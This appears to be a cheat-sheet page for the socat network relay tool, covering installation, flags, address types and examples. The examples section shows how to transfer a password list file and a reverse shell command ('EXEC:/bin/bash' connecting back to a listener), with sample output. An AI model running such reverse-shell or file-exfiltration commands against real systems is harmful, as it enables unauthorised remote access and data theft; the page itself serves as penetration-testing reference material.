---
title : "socat"
# pre : ' '
description : "Multipurpose relay (SOcket CAT)."
date : 2022-08-15T11:11:56+02:00
# hidden : true
# draft : true
weight : 0
tags : ['Networking', 'Relay']
---

## socat

socat is a relay for bidirectional data transfer between two independent data channels. Each of these data channels may be a file, pipe, device (serial line etc. or a pseudo terminal), a socket (UNIX, IP4, IP6 - raw, UDP, TCP), an SSL socket, proxy CONNECT connection, a file descriptor (stdin etc.), the GNU line editor (readline), a program, or a combination of two of these. These modes include generation of "listening" sockets, named pipes, and pseudo terminals.

socat can be used, e.g., as TCP port forwarder (one-shot or daemon), as an external socksifier, for attacking weak firewalls, as a shell interface to UNIX sockets, IP6 relay, for redirecting TCP oriented programs to a serial line, to logically connect serial lines on different computers, or to establish a relatively secure environment (su and  chroot) for running client or server shell scripts with network connections.

Many options are available to refine socats behavior: terminal parameters, open() options, file permissions, file and process owners, basic socket options like  bind address, advanced socket options like IP source routing, linger, TTL, TOS (type of service), or TCP performance tuning.

More capabilities, like daemon mode with forking, client address check, "tail -f" mode, some stream data processing (line terminator conversion), choosing sockets, pipes, or ptys for interprocess communication, debug and trace options, logging to syslog, stderr or file, and last but not least precise error messages make it a versatile tool for many different purposes.

In fact, many of these features already exist in specialized tools; but until now, there does not seem to exists another tool that provides such a generic, flexible, simple and almost comprehensive (UNIX) byte stream connector.

### Installation

#### Debian

```plain
sudo apt install socat
```

#### macOS

```plain
brew install socat
```

### Usage

```plain
socat [options] <bi-address> <bi-address>
```

### Flags

```plain
options:
    -V     print version and feature information to stdout, and exit
    -h|-?  print a help text describing command line options and addresses
    -hh    like -h, plus a list of all common address option names
    -hhh   like -hh, plus a list of all available address option names
    -d[ddd]         increase verbosity (use up to 4 times; 2 are recommended)
    -D     analyze file descriptors before loop
    -ly[facility]  log to syslog, using facility (default is daemon)
    -lf<logfile>   log to file
    -ls            log to stderr (default if no other log)
    -lm[facility]  mixed log mode (stderr during initialization, then syslog)
    -lp<progname>  set the program name used for logging
    -lu            use microseconds for logging timestamps
    -lh            add hostname to log messages
    -v     verbose text dump of data traffic
    -x     verbose hexadecimal dump of data traffic
    -r <file>      raw dump of data flowing from left to right
    -R <file>      raw dump of data flowing from right to left
    -b<size_t>     set data buffer size (8192)
    -s     sloppy (continue on error)
    -t<timeout>    wait seconds before closing second channel
    -T<timeout>    total inactivity timeout in seconds
    -u     unidirectional mode (left to right)
    -U     unidirectional mode (right to left)
    -g     do not check option groups
    -L <lockfile>  try to obtain lock, or fail
    -W <lockfile>  try to obtain lock, or wait
    -4     prefer IPv4 if version is not explicitly specified
    -6     prefer IPv6 if version is not explicitly specified
bi-address:
    pipe[,<opts>]     groups=FD,FIFO
    <single-address>!!<single-address>
    <single-address>
single-address:
    <address-head>[,<opts>]
address-head:
    create:<filename> groups=FD,REG,NAMED
    exec:<command-line>       groups=FD,FIFO,SOCKET,EXEC,FORK,TERMIOS,PTY,PARENT,UNIX
    fd:<num>  groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP,SCTP
    gopen:<filename>  groups=FD,FIFO,CHR,BLK,REG,SOCKET,NAMED,OPEN,TERMIOS,UNIX
    ip-datagram:<host>:<protocol>     groups=FD,SOCKET,RANGE,IP4,IP6
    ip-recv:<protocol>        groups=FD,SOCKET,RANGE,IP4,IP6
    ip-recvfrom:<protocol>    groups=FD,SOCKET,CHILD,RANGE,IP4,IP6
    ip-sendto:<host>:<protocol>       groups=FD,SOCKET,IP4,IP6
    ip4-datagram:<host>:<protocol>    groups=FD,SOCKET,RANGE,IP4
    ip4-recv:<protocol>       groups=FD,SOCKET,RANGE,IP4
    ip4-recvfrom:<protocol>   groups=FD,SOCKET,CHILD,RANGE,IP4
    ip4-sendto:<host>:<protocol>      groups=FD,SOCKET,IP4
    ip6-datagram:<host>:<protocol>    groups=FD,SOCKET,RANGE,IP6
    ip6-recv:<protocol>       groups=FD,SOCKET,RANGE,IP6
    ip6-recvfrom:<protocol>   groups=FD,SOCKET,CHILD,RANGE,IP6
    ip6-sendto:<host>:<protocol>      groups=FD,SOCKET,IP6
    open:<filename>   groups=FD,FIFO,CHR,BLK,REG,NAMED,OPEN,TERMIOS
    openssl:<host>:<port>     groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP,OPENSSL
    openssl-dtls-client:<host>:<port> groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,UDP,OPENSSL
    openssl-dtls-server:<port>        groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,IP6,UDP,OPENSSL
    openssl-listen:<port>     groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,IP6,TCP,OPENSSL
    pipe:<filename>   groups=FD,FIFO,NAMED,OPEN
    proxy:<proxy-server>:<host>:<port>        groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP,HTTP
    pty       groups=FD,NAMED,TERMIOS,PTY
    readline  groups=FD,READLINE,TERMIOS
    sctp-connect:<host>:<port>        groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,SCTP
    sctp-listen:<port>        groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,IP6,SCTP
    sctp4-connect:<host>:<port>       groups=FD,SOCKET,CHILD,RETRY,IP4,SCTP
    sctp4-listen:<port>       groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,SCTP
    sctp6-connect:<host>:<port>       groups=FD,SOCKET,CHILD,RETRY,IP6,SCTP
    sctp6-listen:<port>       groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP6,SCTP
    socket-connect:<domain>:<protocol>:<remote-address>       groups=FD,SOCKET,CHILD,RETRY
    socket-datagram:<domain>:<type>:<protocol>:<remote-address>       groups=FD,SOCKET,RANGE
    socket-listen:<domain>:<protocol>:<local-address> groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE
    socket-recv:<domain>:<type>:<protocol>:<local-address>    groups=FD,SOCKET,RANGE
    socket-recvfrom:<domain>:<type>:<protocol>:<local-address>        groups=FD,SOCKET,CHILD,RANGE
    socket-sendto:<domain>:<type>:<protocol>:<remote-address> groups=FD,SOCKET
    socks4:<socks-server>:<host>:<port>       groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP,SOCKS4
    socks4a:<socks-server>:<host>:<port>      groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP,SOCKS4
    stderr    groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP,SCTP
    stdin     groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP,SCTP
    stdio     groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP,SCTP
    stdout    groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP,SCTP
    system:<shell-command>    groups=FD,FIFO,SOCKET,EXEC,FORK,TERMIOS,PTY,PARENT,UNIX
    tcp-connect:<host>:<port> groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP
    tcp-listen:<port> groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,IP6,TCP
    tcp4-connect:<host>:<port>        groups=FD,SOCKET,CHILD,RETRY,IP4,TCP
    tcp4-listen:<port>        groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,TCP
    tcp6-connect:<host>:<port>        groups=FD,SOCKET,CHILD,RETRY,IP6,TCP
    tcp6-listen:<port>        groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP6,TCP
    udp-connect:<host>:<port> groups=FD,SOCKET,IP4,IP6,UDP
    udp-datagram:<host>:<port>        groups=FD,SOCKET,RANGE,IP4,IP6,UDP
    udp-listen:<port> groups=FD,SOCKET,LISTEN,CHILD,RANGE,IP4,IP6,UDP
    udp-recv:<port>   groups=FD,SOCKET,RANGE,IP4,IP6,UDP
    udp-recvfrom:<port>       groups=FD,SOCKET,CHILD,RANGE,IP4,IP6,UDP
    udp-sendto:<host>:<port>  groups=FD,SOCKET,IP4,IP6,UDP
    udp4-connect:<host>:<port>        groups=FD,SOCKET,IP4,UDP
    udp4-datagram:<host>:<port>       groups=FD,SOCKET,RANGE,IP4,UDP
    udp4-listen:<port>        groups=FD,SOCKET,LISTEN,CHILD,RANGE,IP4,UDP
    udp4-recv:<port>  groups=FD,SOCKET,RANGE,IP4,UDP
    udp4-recvfrom:<port>      groups=FD,SOCKET,CHILD,RANGE,IP4,UDP
    udp4-sendto:<host>:<port> groups=FD,SOCKET,IP4,UDP
    udp6-connect:<host>:<port>        groups=FD,SOCKET,IP6,UDP
    udp6-datagram:<host>:<port>       groups=FD,SOCKET,RANGE,IP6,UDP
    udp6-listen:<port>        groups=FD,SOCKET,LISTEN,CHILD,RANGE,IP6,UDP
    udp6-recv:<port>  groups=FD,SOCKET,RANGE,IP6,UDP
    udp6-recvfrom:<port>      groups=FD,SOCKET,CHILD,RANGE,IP6,UDP
    udp6-sendto:<host>:<port> groups=FD,SOCKET,IP6,UDP
    unix-client:<filename>    groups=FD,SOCKET,NAMED,RETRY,UNIX
    unix-connect:<filename>   groups=FD,SOCKET,NAMED,RETRY,UNIX
    unix-listen:<filename>    groups=FD,SOCKET,NAMED,LISTEN,CHILD,RETRY,UNIX
    unix-recv:<filename>      groups=FD,SOCKET,NAMED,RETRY,UNIX
    unix-recvfrom:<filename>  groups=FD,SOCKET,NAMED,CHILD,RETRY,UNIX
    unix-sendto:<filename>    groups=FD,SOCKET,NAMED,RETRY,UNIX
```

### Examples

#### Send a file to receiver

Sender:

```plain
sudo socat TCP4-LISTEN:443,fork file:list_of_passwords.txt
```

Receiver:

```plain
$ socat TCP4:10.11.0.4:443 file:list_of_passwords.txt,create

C:\Users\crypt0r> type list_of_passwords.txt 
Welkom01
Welcome01
Hellothere!
Summer2022!
```

#### Reverse Shell

Listener:

```plain
$ socat -d -d TCP4-LISTEN:443 STDOUT ... socat[4388] N listening on AF=2 0.0.0.0:443
... socat[4388] N accepting connection from AF=2 10.0.0.11:54720 on 10.0.0.10:443
... socat[4388] N using stdout for reading and writing
... socat[4388] N starting data transfer loop with FDs [4,4] and [1,1]
whoami
kali
id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
```

Target host:

```plain
socat TCP4:10.0.0.10:443 EXEC:/bin/bash
```

### URL list

* [Linux.die.net - socat](https://linux.die.net/man/1/socat)
* [Formulae.brew.sh - socat](https://formulae.brew.sh/formula/socat)
